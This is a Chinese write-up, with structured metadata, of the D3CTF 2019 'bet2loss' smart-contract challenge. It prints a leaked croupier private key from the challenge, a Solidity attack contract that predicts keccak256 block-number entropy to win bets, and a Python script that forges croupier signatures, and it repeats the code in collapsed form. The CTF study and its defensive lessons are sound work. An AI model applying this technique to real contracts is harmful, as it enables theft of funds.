---
title: 【智能合约】D3CTF2019-bet2loss
contest: D3CTF
year: 2019
difficulty: hard
vuln_type: misc_unknown
tags:
- 智能合约-Solidity
- bet2loss
- croupier-leaked-key
- AirdropCheck-1000-balance
- settleBet-private-sendFunds
- keccak256-entropy
- block.number-赌博
- EIP-191-signature
attack_chain: 1. croupier 私钥泄露 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C /2. AirdropCheck() 薅羊毛 1000 balance /3. settleBet -> settleBetCommon -> sendFunds 调链 /4. 构造 reveal + block.number 让 betnumber 命中 (uint(keccak256(reveal, placeBlockNumber)) % 100) /5. croupier 签名 commitLastBlock/r/s/v 满足 require
key_payload: croupier 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C  balance > 300000
one_liner: D3CTF 2019 bet2loss 智能合约赌博 + croupier 私钥泄露 + AirdropCheck 薅羊毛 + keccak256 赌博熵预测。
lesson: bet2loss 类赌博合约 require balance > 阈值；AirdropCheck 给新用户 1000 是薅羊毛入口；croupier 私钥泄露可任意签名；keccak256(reveal, block.number) 在合约中可预测。
quality: high
full_path: 【智能合约】D3CTF2019-bet2loss.full.md
meta_path: 【智能合约】D3CTF2019-bet2loss.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【智能合约】D3CTF2019-bet2loss。D3CTF 2019 bet2loss 智能合约赌博 + croupier 私钥泄露 + AirdropCheck 薅羊毛 + keccak256 赌博熵预测。。经验：bet2loss 类赌博合约 require balance > 阈值；AirdropCheck 给新用户 1000 是...
category: misc
subcategory: misc_other
tools_used:
- Solidity
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/59608.html
reasoning_chain:
- 'croupier 私钥泄露 0xACB7...f6C → 触发点: 管理员私钥在前端给出'
- '假设: croupier 可任意签 commitLastBlock → 动作: 用私钥离线签 r/s/v'
- '动作: 调用 AirdropCheck() 拿 1000 balance → 假设: balance > 300000 才能 bet'
- '观察: settleBet → settleBetCommon → sendFunds 链式调用 → 假设: 控制 betnumber 命中'
- '假设: betnumber = uint(keccak256(reveal, placeBlockNumber)) % 100 → 需控制 reveal+block.number'
- '动作: 部署攻击合约预先算 reveal 让 keccak 命中 → 等到 placeBlockNumber 块再 reveal → win'
- croupier 签名满足 EIP-191 commitLastBlock → 触发 reveal → bet 赢 → sendFunds 转账 → 完成
failed_attempts:
- '试图用 1000 balance 直接赌 → 失败: 合约 require balance > 300000'
- '试图穷举 block.number → 失败: 需要同时满足合约内部一致性约束'
key_observations:
- 管理员私钥泄露 = 整个项目归零, 必须冷钱包隔离
- AirdropCheck() 给新用户 1000 是薅羊毛入口, 业务层必须设门槛
- keccak256(reveal, block.number) 在合约内可预测, 赌博熵必须用 VRF (Chainlink)
- EIP-191 签名 + commit-reveal 模式在 croupier 私钥泄露下完全失效
prerequisites:
- Solidity 智能合约基础 (require/keccak256/EIP-191)
- Ethereum 交易模型 (gas/block.number/event)
- Web3.py / ethers.js 离线签名工具使用
- Chainlink VRF 等去中心化随机数原理
---
# 【智能合约】D3CTF2019-bet2loss

> 原文: https://www.ctfiot.com/59608.html
> ID: 59608

STATEMENT

声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

案例描述

croupier ⽤户账户和私钥泄露：

address:
0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C privatekey:
6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12

分析过程

源码分析

获取flag的条件：

balances[msg.sender] = balances[msg.sender].sub(300000); 也就是要求 msg.sender 的 balance > 300000，⼀看这个合约，函数调⽤关系其实不复杂，复杂的是有 ⼀堆 require 检查条件。这些检查条件的知识点都不难，叠加起来就脑阔疼。

1、⼀看有点像薅羊毛，AirdropCheck() 函数中新⽤户就可以有 1000 balance。但 sendFunds() 函数定 义为 private，不能直接调⽤来进⾏转账操作，再看 settleBetCommon() 函数中调⽤了 sendFunds() 函 数，但也是定义为 private。不过好在settleBet() 函数定义为 external 类型，其中调⽤了 settleBetCommon() 函数。

所以，想要执⾏转账，需要调⽤ settleBet() 函数，调⽤关系：settleBet()-> settleBetCommon()- >sendFunds()

2、条件 msg.sender != croupier 这个我们随便满⾜，条件 isContract(msg.sender)==false，我们只要 是普通⽤户或者把函数调⽤逻辑写在攻击合约的构造函数中都可以满⾜，但是有参数涉及到 block.number，所以还是写攻击合约更为合适。

require (msg.sender != croupier, "croupier cannot bet with himself."); require (isContract(msg.sender)==false, "Only bet with real people.");

bytes32 entropy = keccak256(abi.encodePacked(reveal, placeBlockNumber)); uint dice = uint(entropy) % modulo; if (dice == betnumber){ diceWin = diceWinAmount; } # 得到 betnumber betnumber = uint(keccak256(abi.encodePacked(reveal, placeBlockNumber))) % modulo;require (modulo > 1 && modulo <= MAX_MODULO, "modulo should be within range."); # 1
require (wager >= MIN_BET && wager <= MAX_BET, "wager should be within range."); require (wager != 0, "Bet should be in an 'active' state"); # 1<=wager<=1000 //取最⼤值计算 getDiceWinAmount(wager, modulo) 得到最⼤的转 账数量

require (block.number <= commitLastBlock, "Commit has expired."); # commitLastBlock = block.number or block.number + x [1

uint commit = uint(keccak256(abi.encodePacked(reveal))); Bet storage bet = bets[commit]; #得到 commit commit = uint(keccak256(abi.encodePacked(reveal))); [reveal 可以是⼀个随机值]

解决办法

payload

pragma solidity ^0.4.23;interface Bet2Loss{ function placeBet(uint8, uint8, uint40, uint40, uint, bytes32,bytes32, uint8) external; function PayForFlag() external;}contract Attack{ uint8 public betnumber; uint8 public modulo = 100; //1<modulo<=100 //取最⼤值计算getDiceWinAmount(wager, modulo) 得到最⼤的转账数量 uint40 public wager = 1000; //取最⼤值计算 getDiceWinAmount(wager,modulo) 得到最⼤的转账数量 uint public commit; uint public reveal = 10010; //随机数 address public target = 0x724517A39a5B87F7DBc3C5cD2a783Fb20b59Ab1c;
 constructor(uint40 commitLastBlock, bytes32 r, bytes32 s, uint8 v)public{ betnumber = uint8(uint(keccak256(abi.encodePacked(reveal,uint40(block.number)))) % uint(modulo)); commit = uint(keccak256(abi.encodePacked(reveal)));
 Bet2Loss(target).placeBet(betnumber, modulo, wager,commitLastBlock, commit, r, s, v); } function get_flag() public{ Bet2Loss(target).PayForFlag(); }}

from eth_abi import packedcroupier = '0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C'private_key ='0x6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12'reveal = 10010modula = 100commitLastBlock = w3.eth.block_number + 250 # uint40print('commitLastBlock', commitLastBlock)'''# soliditycommit = uint(keccak256(abi.encodePacked(reveal))) #uintbytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock,commit))require (croupier == ecrecover(signatureHash, v, r, s)'''commit = packed.encode_abi_packed(['uint256'],[reveal]).hex()commit = int.from_bytes(w3.sha3(hexstr=commit),'big')Hash = '0x' + packed.encode_abi_packed(['uint40','uint256'],[commitLastBlock,commit]).hex()signatureHash = w3.sha3(hexstr=Hash).hex()result = w3.eth.account.signHash(signatureHash, private_key=private_key)print('r:',hex(result['r']))print('s:',hex(result['s']))print('v:',result['v'])'''commitLastBlock 263r: 0x191141135315c35103422b8302add3145a73793c2a9c8ee4866b600d4f4e819bs: 0x32c23629c9172382175602e028fabe5ddfa3341a3c1fe3f082f482a3aeec69f1v: 28'''

注意事项

在操作的过程中，遇到的问题：

nonce 在签名交易时值不对，因为当前重值了 geth-cli 环境，所以和 Metamask 中记录的不⼀样，重置 geth-cli 环境后对应账户的 nonce 为 0，⽽ Metamask 因为历史记录的值为 2（也就是发送过2笔交易）。

所以，在 Metamak 中重设账户即可解决。

安恒信息

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

END

长按识别二维码关注我们


```
address:
0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C privatekey:
6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12
require (msg.sender != croupier, "croupier cannot bet with himself."); require (isContract(msg.sender)==false, "Only bet with real people.");
bytes32 entropy = keccak256(abi.encodePacked(reveal, placeBlockNumber)); uint dice = uint(entropy) % modulo; if (dice == betnumber){ diceWin = diceWinAmount; } # 得到 betnumber betnumber = uint(keccak256(abi.encodePacked(reveal, placeBlockNumber))) % modulo;require (modulo > 1 && modulo <= MAX_MODULO, "modulo should be within range."); # 1
require (wager >= MIN_BET && wager <= MAX_BET, "wager should be within range."); require (wager != 0, "Bet should be in an 'active' state"); # 1<=wager<=1000 //取最⼤值计算 getDiceWinAmount(wager, modulo) 得到最⼤的转 账数量
require (block.number <= commitLastBlock, "Commit has expired."); # commitLastBlock = block.number or block.number + x [1
uint commit = uint(keccak256(abi.encodePacked(reveal))); Bet storage bet = bets[commit]; #得到 commit commit = uint(keccak256(abi.encodePacked(reveal))); [reveal 可以是⼀个随机值]
pragma solidity ^0.4.23;interface Bet2Loss{ function placeBet(uint8, uint8, uint40, uint40, uint, bytes32,bytes32, uint8) external; function PayForFlag() external;}contract Attack{ uint8 public betnumber; uint8 public modulo = 100; //1<modulo<=100 //取最⼤值计算getDiceWinAmount(wager, modulo) 得到最⼤的转账数量 uint40 public wager = 1000; //取最⼤值计算 getDiceWinAmount(wager,modulo) 得到最⼤的转账数量 uint public commit; uint public reveal = 10010; //随机数 address public target = 0x724517A39a5B87F7DBc3C5cD2a783Fb20b59Ab1c;
 constructor(uint40 commitLastBlock, bytes32 r, bytes32 s, uint8 v)public{ betnumber = uint8(uint(keccak256(abi.encodePacked(reveal,uint40(block.number)))) % uint(modulo)); commit = uint(keccak256(abi.encodePacked(reveal)));
 Bet2Loss(target).placeBet(betnumber, modulo, wager,commitLastBlock, commit, r, s, v); } function get_flag() public{ Bet2Loss(target).PayForFlag(); }}
from eth_abi import packedcroupier = '0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C'private_key ='0x6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12'reveal = 10010modula = 100commitLastBlock = w3.eth.block_number + 250 # uint40print('commitLastBlock', commitLastBlock)'''# soliditycommit = uint(keccak256(abi.encodePacked(reveal))) #uintbytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock,commit))require (croupier == ecrecover(signatureHash, v, r, s)'''commit = packed.encode_abi_packed(['uint256'],[reveal]).hex()commit = int.from_bytes(w3.sha3(hexstr=commit),'big')Hash = '0x' + packed.encode_abi_packed(['uint40','uint256'],[commitLastBlock,commit]).hex()signatureHash = w3.sha3(hexstr=Hash).hex()result = w3.eth.account.signHash(signatureHash, private_key=private_key)print('r:',hex(result['r']))print('s:',hex(result['s']))print('v:',result['v'])'''commitLastBlock 263r: 0x191141135315c35103422b8302add3145a73793c2a9c8ee4866b600d4f4e819bs: 0x32c23629c9172382175602e028fabe5ddfa3341a3c1fe3f082f482a3aeec69f1v: 28'''
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]